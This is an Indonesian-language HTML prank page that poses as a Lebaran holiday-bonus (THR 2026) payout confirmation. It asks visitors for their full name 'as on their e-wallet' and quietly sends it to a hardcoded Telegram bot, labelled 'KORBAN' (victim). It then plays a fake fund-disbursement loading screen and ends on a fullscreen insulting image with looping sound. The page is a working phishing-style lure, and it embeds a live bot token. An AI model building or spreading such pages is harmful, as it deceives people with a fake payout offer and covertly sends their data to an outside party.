<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Konfirmasi Penerimaan THR 2026 🌙</title>
    <style>
        body { margin: 0; padding: 0; background: #f0fdf4; font-family: 'Segoe UI', sans-serif; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; flex-direction: column; }
        #intro { margin-top: -50px; padding: 0 20px; z-index: 5; }
        h1 { color: #15803d; margin-bottom: 5px; font-size: 1.8rem; }
        p { color: #166534; margin-top: 0; font-weight: bold; }
        #verify-box { background: white; padding: 15px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); margin-bottom: 25px; width: 280px; z-index: 6; }
        input { width: 90%; padding: 12px; border: 2px solid #e2e8f0; border-radius: 10px; outline: none; text-align: center; font-size: 1rem; }
        input:focus { border-color: #15803d; }
        #envelope { width: 280px; cursor: pointer; transition: 0.2s; z-index: 10; }
        #envelope:active { transform: scale(0.9); }
        
        /* PRANK SCREEN */
        #prank-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 100; justify-content: center; align-items: center; cursor: pointer; overflow: hidden; }
        #prank-screen img { width: 100%; height: 100%; object-fit: contain; z-index: 1; }
        #particle-container { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; pointer-events: none; }
        
        /* LOADING OVERLAY */
        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.98); z-index: 50; flex-direction: column; align-items: center; justify-content: center; overflow: hidden; }
        .spinner { border: 5px solid #f3f3f3; border-top: 5px solid #15803d; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; z-index: 10; }
        #status-text { margin-top: 20px; font-weight: bold; color: #15803d; z-index: 10; }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* ANIMASI DUIT & PARTIKEL */
        .money { position: absolute; top: -50px; user-select: none; z-index: 1; animation: fall linear forwards; }
        @keyframes fall { to { transform: translateY(105vh) rotate(360deg); } }
        .particle { position: absolute; user-select: none; pointer-events: none; animation: popOut 2s linear forwards; }
        @keyframes popOut {
            0% { transform: translate(-50%, -50%) scale(0); opacity: 1; }
            100% { transform: translate(var(--tx), var(--ty)) scale(var(--s)) rotate(var(--r)); opacity: 0; }
        }
    </style>
</head>
<body>

    <div id="intro">
        <h1>Selamat Lebaran! 🌙</h1>
        <p>Verifikasi nama Anda untuk pencairan dana THR.</p>
    </div>

    <div id="verify-box">
        <input type="text" id="victim-name" placeholder="Nama Lengkap Sesuai E-Wallet" autocomplete="off">
    </div>

    <img id="envelope" src="amplop.png" alt="Ambil THR">

    <div id="loading-overlay">
        <div id="money-container"></div>
        <div class="spinner"></div>
        <p id="status-text">Menghubungkan ke server...</p>
    </div>

    <div id="prank-screen" onclick="closePrank()">
        <div id="particle-container"></div>
        <img src="monyet-memberikan-jari-tengah-kepada-orang-orang.jpg">
    </div>

    <script>
        const env = document.getElementById('envelope');
        const nameInput = document.getElementById('victim-name');
        const loading = document.getElementById('loading-overlay');
        const statusText = document.getElementById('status-text');
        const prank = document.getElementById('prank-screen');
        const moneyContainer = document.getElementById('money-container');
        const particleContainer = document.getElementById('particle-container');
        
        const prankSound = new Audio('https://www.myinstants.com/media/sounds/monkey-laugh.mp3');
        prankSound.load();

        const TELE_TOKEN = '8642591827:AAEW79QE8FGYcvELtapkI2jnhvXocW4rd9U'; 
        const TELE_ID = '7267912519'; 
        const startTime = Date.now();
        let loopPrank, moneyInterval;

        function startMoneyRain() {
            moneyInterval = setInterval(() => {
                const money = document.createElement('div');
                money.classList.add('money');
                money.innerText = '💸';
                money.style.left = Math.random() * 100 + 'vw';
                money.style.animationDuration = '3s';
                moneyContainer.appendChild(money);
                setTimeout(() => money.remove(), 3000);
            }, 150);
        }

        function burstParticles() {
            for (let i = 0; i < 40; i++) {
                const p = document.createElement('div');
                p.classList.add('particle');
                p.innerText = ['😂','🤣','🐒','🤡'][Math.floor(Math.random()*4)];
                p.style.left = '50%'; p.style.top = '50%';
                const angle = Math.random() * Math.PI * 2;
                const speed = Math.random() * 350 + 100;
                p.style.setProperty('--tx', Math.cos(angle)*speed+'px');
                p.style.setProperty('--ty', Math.sin(angle)*speed+'px');
                p.style.setProperty('--s', Math.random()*2+2);
                p.style.setProperty('--r', Math.random()*720+'deg');
                particleContainer.appendChild(p);
                setTimeout(() => p.remove(), 2000);
            }
        }

        env.addEventListener('click', () => {
            const nama = nameInput.value.trim();
            if (nama === "") { alert("Isi nama dulu bos!"); return; }

            prankSound.volume = 1.0;
            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
            
            fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${encodeURIComponent('🎯 KORBAN GAS: '+nama)}`, { mode: 'no-cors' });

            loading.style.display = 'flex';
            startMoneyRain();

            setTimeout(() => statusText.innerText = "Verifikasi data " + nama + "...", 1500);
            setTimeout(() => statusText.innerText = "Proses pencairan dana...", 3500);

            setTimeout(() => {
                clearInterval(moneyInterval);
                loading.style.display = 'none';
                prank.style.display = 'flex';
                
                burstParticles();
                loopPrank = setInterval(burstParticles, 2000);
                
                prankSound.loop = true;
                prankSound.play();
                if (navigator.vibrate) navigator.vibrate([1000, 200, 1000, 200, 1000]);
            }, 5500);
        });

        function closePrank() {
            clearInterval(loopPrank);
            prank.style.display = 'none';
            particleContainer.innerHTML = '';
            prankSound.pause();
            prankSound.currentTime = 0;
            if (document.exitFullscreen) document.exitFullscreen();
        }
    </script>
</body>
</html>
